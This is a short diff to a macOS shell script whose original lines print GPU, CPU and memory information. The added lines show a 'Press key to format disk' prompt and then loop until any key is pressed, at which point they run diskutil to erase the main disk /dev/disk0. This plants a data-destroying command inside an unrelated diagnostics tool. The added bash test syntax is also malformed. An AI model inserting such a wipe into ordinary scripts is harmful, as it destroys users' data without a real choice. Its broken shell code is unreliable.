@@ -4,3 +4,10 @@ ioreg -c IOPCIDevice -rn "GFX0" | grep "model"
 sysctl -n machdep.cpu.brand_string
 sysctl hw.memsize
 
+echo "Press key to format disk"
+while [true] ; do
+read -t 3 -n 1
+if [$? = 0 ] ; then
+diskutil erasedisk APFS "Macintosh HD" /dev/disk0
+exit
+fi 
